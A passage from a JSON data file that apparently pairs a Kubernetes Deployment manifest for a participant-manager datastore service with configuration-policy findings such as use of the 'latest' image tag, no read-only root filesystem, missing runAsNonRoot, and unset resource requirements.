consent_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: LOG_PATH\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: log_path\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /participant-manager-datastore/healthCheck\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 400Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=mizuerwi-dev-data:asia-northeast1:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: participant-manager-gke-sa-gcloud-key\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cloudsql-proxy\" is using an invalid container image, \"gcr.io/cloudsql-docker/gce-proxy:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10309",
    "manifest_path": "data/manifests/the_stack_sample/sample_3972.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: participant-manager-datastore\n  labels:\n    app: participant-manager-datastore\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: participant-manager-datastore\n  template:\n    metadata:\n      labels:\n        app: participant-manager-datastore\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: participant-manager-datastore\n        image: gcr.io/mizuerwi-dev-apps/participant-manager-datastore:latest\n        env:\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbname\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbpassword\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: secret_key\n        - name: MAIL_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: MAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: MAIL_CONTACT_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: contact_email_address\n        - name: MAIL_FROM_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_address\n        - name: HYDRA_ADMIN_URL\n          value: http://hydra-admin-np:50000\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: PARTICIPANT_MANAGER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: base_url\n        - name: PARTICIPANT_MANAGER_URL\n          value: $(PARTICIPANT_MANAGER_BASE_URL)/participant-manager\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: consent_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: LOG_PATH\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: log_path\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /participant-manager-datastore/healthCheck\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 400Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=mizuerwi-dev-data:asia-northeast1:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: participant-manager-gke-sa-gcloud-key\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"participant-manager-datastore\" is using an invalid container image, \"gcr.io/mizuerwi-dev-apps/participant-manager-datastore:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10310",
    "manifest_path": "data/manifests/the_stack_sample/sample_3972.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: participant-manager-datastore\n  labels:\n    app: participant-manager-datastore\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: participant-manager-datastore\n  template:\n    metadata:\n      labels:\n        app: participant-manager-datastore\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: participant-manager-datastore\n        image: gcr.io/mizuerwi-dev-apps/participant-manager-datastore:latest\n        env:\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbname\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbpassword\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: secret_key\n        - name: MAIL_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: MAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: MAIL_CONTACT_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: contact_email_address\n        - name: MAIL_FROM_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_address\n        - name: HYDRA_ADMIN_URL\n          value: http://hydra-admin-np:50000\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: PARTICIPANT_MANAGER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: base_url\n        - name: PARTICIPANT_MANAGER_URL\n          value: $(PARTICIPANT_MANAGER_BASE_URL)/participant-manager\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: consent_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: LOG_PATH\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: log_path\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /participant-manager-datastore/healthCheck\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 400Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=mizuerwi-dev-data:asia-northeast1:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: participant-manager-gke-sa-gcloud-key\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cloudsql-proxy\" does not have a read-only root file system"
  },
  {
    "id": "10311",
    "manifest_path": "data/manifests/the_stack_sample/sample_3972.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: participant-manager-datastore\n  labels:\n    app: participant-manager-datastore\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: participant-manager-datastore\n  template:\n    metadata:\n      labels:\n        app: participant-manager-datastore\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: participant-manager-datastore\n        image: gcr.io/mizuerwi-dev-apps/participant-manager-datastore:latest\n        env:\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbname\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbpassword\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: secret_key\n        - name: MAIL_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: MAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: MAIL_CONTACT_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: contact_email_address\n        - name: MAIL_FROM_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_address\n        - name: HYDRA_ADMIN_URL\n          value: http://hydra-admin-np:50000\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: PARTICIPANT_MANAGER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: base_url\n        - name: PARTICIPANT_MANAGER_URL\n          value: $(PARTICIPANT_MANAGER_BASE_URL)/participant-manager\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: consent_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: LOG_PATH\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: log_path\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /participant-manager-datastore/healthCheck\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 400Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=mizuerwi-dev-data:asia-northeast1:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: participant-manager-gke-sa-gcloud-key\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"participant-manager-datastore\" does not have a read-only root file system"
  },
  {
    "id": "10312",
    "manifest_path": "data/manifests/the_stack_sample/sample_3972.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: participant-manager-datastore\n  labels:\n    app: participant-manager-datastore\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: participant-manager-datastore\n  template:\n    metadata:\n      labels:\n        app: participant-manager-datastore\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: participant-manager-datastore\n        image: gcr.io/mizuerwi-dev-apps/participant-manager-datastore:latest\n        env:\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbname\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbpassword\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: secret_key\n        - name: MAIL_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: MAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: MAIL_CONTACT_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: contact_email_address\n        - name: MAIL_FROM_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_address\n        - name: HYDRA_ADMIN_URL\n          value: http://hydra-admin-np:50000\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: PARTICIPANT_MANAGER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: base_url\n        - name: PARTICIPANT_MANAGER_URL\n          value: $(PARTICIPANT_MANAGER_BASE_URL)/participant-manager\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: consent_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: LOG_PATH\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: log_path\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /participant-manager-datastore/healthCheck\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 400Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=mizuerwi-dev-data:asia-northeast1:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: participant-manager-gke-sa-gcloud-key\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cloudsql-proxy\" is not set to runAsNonRoot"
  },
  {
    "id": "10313",
    "manifest_path": "data/manifests/the_stack_sample/sample_3972.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: participant-manager-datastore\n  labels:\n    app: participant-manager-datastore\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: participant-manager-datastore\n  template:\n    metadata:\n      labels:\n        app: participant-manager-datastore\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: participant-manager-datastore\n        image: gcr.io/mizuerwi-dev-apps/participant-manager-datastore:latest\n        env:\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbname\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbpassword\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: secret_key\n        - name: MAIL_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: MAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: MAIL_CONTACT_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: contact_email_address\n        - name: MAIL_FROM_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_address\n        - name: HYDRA_ADMIN_URL\n          value: http://hydra-admin-np:50000\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: PARTICIPANT_MANAGER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: base_url\n        - name: PARTICIPANT_MANAGER_URL\n          value: $(PARTICIPANT_MANAGER_BASE_URL)/participant-manager\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: consent_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: LOG_PATH\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: log_path\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /participant-manager-datastore/healthCheck\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 400Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=mizuerwi-dev-data:asia-northeast1:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: participant-manager-gke-sa-gcloud-key\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"participant-manager-datastore\" is not set to runAsNonRoot"
  },
  {
    "id": "10314",
    "manifest_path": "data/manifests/the_stack_sample/sample_3972.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: participant-manager-datastore\n  labels:\n    app: participant-manager-datastore\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: participant-manager-datastore\n  template:\n    metadata:\n      labels:\n        app: participant-manager-datastore\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: participant-manager-datastore\n        image: gcr.io/mizuerwi-dev-apps/participant-manager-datastore:latest\n        env:\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbname\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbpassword\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: secret_key\n        - name: MAIL_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: MAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: MAIL_CONTACT_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: contact_email_address\n        - name: MAIL_FROM_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_address\n        - name: HYDRA_ADMIN_URL\n          value: http://hydra-admin-np:50000\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: PARTICIPANT_MANAGER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: base_url\n        - name: PARTICIPANT_MANAGER_URL\n          value: $(PARTICIPANT_MANAGER_BASE_URL)/participant-manager\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: consent_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: LOG_PATH\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: log_path\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /participant-manager-datastore/healthCheck\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 400Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=mizuerwi-dev-data:asia-northeast1:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: participant-manager-gke-sa-gcloud-key\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cloudsql-proxy\" has cpu request 0"
  },
  {
    "id": "10315",
    "manifest_path": "data/manifests/the_stack_sample/sample_3972.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: participant-manager-datastore\n  labels:\n    app: participant-manager-datastore\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: participant-manager-datastore\n  template:\n    metadata:\n      labels:\n        app: participant-manager-datastore\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: participant-manager-datastore\n        image: gcr.io/mizuerwi-dev-apps/participant-manager-datastore:latest\n        env:\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbname\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbpassword\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: secret_key\n        - name: MAIL_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: MAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: MAIL_CONTACT_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: contact_email_address\n        - name: MAIL_FROM_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_address\n        - name: HYDRA_ADMIN_URL\n          value: http://hydra-admin-np:50000\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: PARTICIPANT_MANAGER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: base_url\n        - name: PARTICIPANT_MANAGER_URL\n          value: $(PARTICIPANT_MANAGER_BASE_URL)/participant-manager\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: consent_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: LOG_PATH\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: log_path\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /participant-manager-datastore/healthCheck\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 400Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=mizuerwi-dev-data:asia-northeast1:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: participant-manager-gke-sa-gcloud-key\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cloudsql-proxy\" has memory limit 0"
  },
  {
    "id": "10316",
    "manifest_path": "data/manifests/the_stack_sample/sample_3972.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: participant-manager-datastore\n  labels:\n    app: participant-manager-datastore\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: participant-manager-datastore\n  template:\n    metadata:\n      labels:\n        app: participant-manager-datastore\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: participant-manager-datastore\n        image: gcr.io/mizuerwi-dev-apps/participant-manager-datastore:latest\n        env:\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbname\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: dbpassword\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: participant-manager-datastore-credentials\n              key: secret_key\n        - name: MAIL_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: MAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: MAIL_CONTACT_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: contact_email_address\n        - name: MAIL_FROM_EMAIL\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_address\n        - name: HYDRA_ADMIN_URL\n          value: http://hydra-admin-np:50000\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: PARTICIPANT_MANAGER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: base_url\n        - name: PARTICIPANT_MANAGER_URL\n          value: $(PARTICIPANT_MANAGER_BASE_URL)/participant-manager\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: consent_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: LOG_PATH\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: log_path\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /participant-manager-datastore/healthCheck\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 400Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=mizuerwi-dev-data:asia-northeast1:mystudies=tcp:3306\n        - 